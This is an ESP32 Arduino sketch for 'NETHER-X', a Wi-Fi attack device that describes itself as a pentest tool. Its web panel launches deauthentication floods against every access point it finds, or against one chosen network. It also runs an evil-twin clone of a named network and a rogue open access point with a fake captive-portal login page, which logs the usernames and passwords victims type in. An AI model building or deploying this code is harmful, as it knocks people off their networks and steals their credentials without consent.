#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_wifi.h>

Preferences prefs;
WebServer server(80);
DNSServer dns;

String ap_ssid = "GMpro";
String ap_pass = "Sangkur87";
IPAddress apIP(192, 168, 4, 1);

bool attackOn = false;
bool evilTwinOn = false;
bool rogueOn = false;

struct Target {
  String ssid;
  String bssid;
  int ch;
  int rssi;
};

Target targets[30];
int targetCount = 0;
unsigned long bootTime = 0;

void startAP() {
  Serial.println("[AP] Starting...");
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  delay(50);
  bool ok = WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
  Serial.println("[AP] Result: " + String(ok ? "OK" : "FAIL"));
  Serial.println("[AP] IP: " + WiFi.softAPIP().toString());
  Serial.println("[AP] Clients: " + String(WiFi.softAPgetStationNum()));
}

void scanNetworks() {
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  int n = WiFi.scanNetworks();
  targetCount = min(n, 30);
  for (int i = 0; i < targetCount; i++) {
    targets[i].ssid = WiFi.SSID(i);
    targets[i].bssid = WiFi.BSSIDstr(i);
    targets[i].ch = WiFi.channel(i);
    targets[i].rssi = WiFi.RSSI(i);
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_AP);
  Serial.println("[SCAN] Found: " + String(targetCount));
}

void sendDeauth(uint8_t* bssid, int ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t pkt[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&pkt[4], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
    delayMicroseconds(100);
  }
}

void deauthTask(void* param) {
  Serial.println("[DEAUTH] Started");
  while (attackOn) {
    for (int ch = 1; ch <= 13; ch++) {
      if (!attackOn) break;
      WiFi.mode(WIFI_AP_STA);
      delay(10);
      int n = WiFi.scanNetworks();
      for (int i = 0; i < n; i++) {
        if (!attackOn) break;
        if (WiFi.channel(i) == ch) {
          uint8_t bssid[6];
          String bssidStr = WiFi.BSSIDstr(i);
          sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
          sendDeauth(bssid, ch);
        }
      }
      WiFi.scanDelete();
      delay(10);
      WiFi.mode(WIFI_AP);
    }
  }
  Serial.println("[DEAUTH] Stopped");
  vTaskDelete(NULL);
}

void handleRoot() {
  String h = "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>NETHER-X</title>";
  h += "<style>";
  h += "* {margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#0d0d1a;color:#fff;min-height:100vh}";
  h += ".h{background:linear-gradient(135deg,#0066ff,#003399);padding:20px;text-align:center}.h h1{color:#0ff;font-size:2em}";
  h += ".c{max-width:1200px;margin:0 auto;padding:20px}";
  h += ".g{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px}";
  h += ".card{background:#1a1a3a;border:2px solid #0066ff;border-radius:10px;padding:15px}";
  h += ".card h2{color:#0ff;border-bottom:1px solid #0066ff;padding-bottom:10px}";
  h += "button{background:linear-gradient(135deg,#0066ff,#003399);color:#fff;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin:3px}";
  h += ".b1{background:linear-gradient(135deg,#0f0,#090)}.b2{background:linear-gradient(135deg,#f00,#900)}";
  h += "input{width:100%;padding:10px;margin:5px 0;background:#0d0d2a;border:1px solid #0066ff;color:#fff;border-radius:5px}";
  h += "table{width:100%;border-collapse:collapse}th{background:#0066ff;padding:10px;text-align:left}";
  h += "td{padding:8px;border-bottom:1px solid #333}";
  h += ".log{background:#000;border:1px solid #0f0;border-radius:5px;padding:10px;font-family:monospace;max-height:200px;overflow-y:auto;color:#0f0}";
  h += "</style></head>";
  h += "<div class='h'><h1>NETHER-X</h1><p>WiFi Pentest Tool</p></div>";
  h += "<div class='c'><div class='g'>";
  h += "<div class='card'><h2>Status</h2>";
  h += "<p>SSID: <b>" + ap_ssid + "</b></p>";
  h += "<p>PASS: <b>" + ap_pass + "</b></p>";
  h += "<p>IP: <b>192.168.4.1</b></p>";
  h += "<p>Mode: <b>" + String(attackOn ? "ATTACK" : "IDLE") + "</b></p>";
  h += "<p>Clients: <b>" + String(WiFi.softAPgetStationNum()) + "</b></p>";
  h += "<p>Uptime: <b id='t'>0s</b></p></div>";
  h += "<div class='card'><h2>Scanner</h2><button onclick='scan()'>Scan</button><div id='nl'></div></div>";
  h += "<div class='card'><h2>Deauth</h2><button class='b1' onclick='ds()'>Start</button><button class='b2' onclick='dss()'>Stop</button></div>";
  h += "<div class='card'><h2>Evil Twin</h2><input id='et' placeholder='SSID'><input id='ch' type='number' value='1'><button onclick='et1()'>Start</button><button class='b2' onclick='et0()'>Stop</button></div>";
  h += "<div class='card'><h2>Rogue AP</h2><input id='rs' value='Free_WiFi'><button onclick='rs1()'>Start</button><button class='b2' onclick='rs0()'>Stop</button></div>";
  h += "<div class='card'><h2>Logs</h2><button onclick='lg()'>Refresh</button><button class='b2' onclick='cl()'>Clear</button><div id='lg' class='log'>No data</div></div>";
  h += "<div class='card'><h2>Settings</h2><input id='ss' value='" + ap_ssid + "'><input id='pp' value='" + ap_pass + "'><button onclick='sv()'>Save</button><button class='b2' onclick='rst()'>Reset</button></div>";
  h += "</div></div>";
  h += "<script>";
  h += "function scan(){fetch('/scan').then(r=>r.json()).then(d=>{let t='<table><tr><th>#</th><th>SSID</th><th>dBm</th><th>CH</th><th></th></tr>';";
  h += "d.forEach((x,i)=>{t+='<tr><td>'+i+'</td><td>'+(x.s||'?')+'</td><td>'+x.r+'</td><td>'+x.c+'</td><td><button onclick=dq('+i+')>Deauth</button></td></tr>'});";
  h += "document.getElementById('nl').innerHTML=t+'</table>';});}";
  h += "function dq(i){fetch('/dq?i='+i);}";
  h += "function ds(){fetch('/ds');}";
  h += "function dss(){fetch('/dss');location.reload();}";
  h += "function et1(){fetch('/et?s='+encodeURIComponent(document.getElementById('et').value)+'&c='+document.getElementById('ch').value);}";
  h += "function et0(){fetch('/et0');}";
  h += "function rs1(){fetch('/rs?s='+encodeURIComponent(document.getElementById('rs').value));}";
  h += "function rs0(){fetch('/rs0');}";
  h += "function lg(){fetch('/lg').then(r=>r.text()).then(d=>document.getElementById('lg').textContent=d);}";
  h += "function cl(){fetch('/cl');lg();}";
  h += "function sv(){fetch('/sv?s='+encodeURIComponent(document.getElementById('ss').value)+'&p='+encodeURIComponent(document.getElementById('pp').value)).then(()=>alert('Saved!'));}";
  h += "function rst(){if(confirm('Reset?'))fetch('/rst');}";
  h += "setInterval(()=>{document.getElementById('t').textContent=Math.floor((Date.now()- " + String(millis()) + ")/1000)+'s';},1000);";
  h += "scan();</script></body></html>";
  server.send(200, "text/html", h);
}

void handleScan() {
  scanNetworks();
  String j = "[";
  for (int i = 0; i < targetCount; i++) {
    if (i > 0) j += ",";
    j += "{\"s\":\"" + targets[i].ssid + "\",\"b\":\"" + targets[i].bssid + "\",\"r\":" + String(targets[i].rssi) + ",\"c\":" + String(targets[i].ch) + "}";
  }
  j += "]";
  server.send(200, "application/json", j);
}

void handleDeauthStart() {
  if (!attackOn) {
    attackOn = true;
    xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 0);
  }
  server.send(200, "text/plain", "OK");
}

void handleDeauthStop() {
  attackOn = false;
  server.send(200, "text/plain", "OK");
}

void handleDeauthOne() {
  int idx = server.arg("i").toInt();
  if (idx >= 0 && idx < targetCount) {
    uint8_t bssid[6];
    String bssidStr = targets[idx].bssid;
    sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    sendDeauth(bssid, targets[idx].ch);
  }
  server.send(200, "text/plain", "OK");
}

void handleETStart() {
  String ssid = server.arg("s");
  String ch = server.arg("c");
  if (ssid.length() > 0) {
    evilTwinOn = true;
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
  }
  server.send(200, "text/plain", "OK");
}

void handleETStop() {
  evilTwinOn = false;
  dns.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

void handleRogueStart() {
  String ssid = server.arg("s");
  if (ssid.length() > 0) {
    rogueOn = true;
    WiFi.softAPdisconnect(true);
    dns.stop();
    delay(200);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
    server.on("/login", HTTP_POST, [&]() {
      String u = server.arg("user");
      String p = server.arg("pass");
      prefs.begin("netherx", true);
      String l = prefs.getString("log", "");
      l += "User:" + u + " Pass:" + p + "\n";
      prefs.putString("log", l);
      prefs.end();
      server.send(200, "text/html", "<html><body style='background:#000;color:#0f0;padding:50px;text-align:center'><h1>Connected!</h1></body></html>");
    });
    server.onNotFound([]() {
      server.send(200, "text/html", "<html><body style='background:#000;color:#fff;padding:30px'><h1>WiFi Login</h1><form action='/login' method='post'><input name='user' placeholder='Username' style='display:block;width:100%;padding:10px;margin:10px 0'><input name='pass' type='password' placeholder='Password' style='display:block;width:100%;padding:10px;margin:10px 0'><button style='width:100%;padding:15px;background:#0f0;border:none'>Connect</button></form></body></html>");
    });
  }
  server.send(200, "text/plain", "OK");
}

void handleRogueStop() {
  rogueOn = false;
  dns.stop();
  server.onNotFound([]() {});
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

void handleLogs() {
  prefs.begin("netherx", false);
  String log = prefs.getString("log", "No data");
  prefs.end();
  server.send(200, "text/plain", log);
}

void handleClearLogs() {
  prefs.begin("netherx", true);
  prefs.putString("log", "");
  prefs.end();
  server.send(200, "text/plain", "OK");
}

void handleSave() {
  String s = server.arg("s");
  String p = server.arg("p");
  if (s.length() > 0 && p.length() >= 8) {
    prefs.begin("netherx", true);
    prefs.putString("ssid", s);
    prefs.putString("pass", p);
    prefs.end();
    ESP.restart();
  }
  server.send(200, "text/plain", "OK");
}

void handleReset() {
  prefs.begin("netherx", true);
  prefs.clear();
  prefs.end();
  ESP.restart();
}

void handleCaptive() {
  server.sendHeader("Location", "http://192.168.4.1/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(500);
  
  prefs.begin("netherx", false);
  String s = prefs.getString("ssid", "");
  String p = prefs.getString("pass", "");
  if (s.length() > 0) ap_ssid = s;
  if (p.length() >= 8) ap_pass = p;
  prefs.end();
  
  Serial.println("==============");
  Serial.println("NETHER-X v1.0");
  Serial.println("SSID: " + ap_ssid);
  Serial.println("PASS: " + ap_pass);
  Serial.println("==============");
  
  startAP();
  
  dns.setErrorReplyCode(DNSReplyCode::NoError);
  dns.start(53, "*", apIP);
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/ds", handleDeauthStart);
  server.on("/dss", handleDeauthStop);
  server.on("/dq", handleDeauthOne);
  server.on("/et", handleETStart);
  server.on("/et0", handleETStop);
  server.on("/rs", handleRogueStart);
  server.on("/rs0", handleRogueStop);
  server.on("/lg", handleLogs);
  server.on("/cl", handleClearLogs);
  server.on("/sv", handleSave);
  server.on("/rst", handleReset);
  server.on("/generate_204", handleCaptive);
  server.begin();
  
  bootTime = millis();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  Serial.println("Ready!");
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  digitalWrite(LED_BUILTIN, attackOn ? (millis() % 200 < 100) : (evilTwinOn || rogueOn ? HIGH : LOW));
}